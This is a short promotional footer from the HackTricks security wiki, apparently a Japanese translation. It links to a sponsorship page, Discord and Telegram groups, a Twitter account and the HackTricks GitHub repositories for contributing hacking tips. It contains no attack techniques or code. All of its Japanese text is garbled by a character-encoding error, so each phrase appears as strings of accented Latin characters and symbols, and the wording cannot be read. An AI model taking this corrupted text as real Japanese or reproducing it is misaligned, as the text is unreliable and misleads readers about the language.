* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
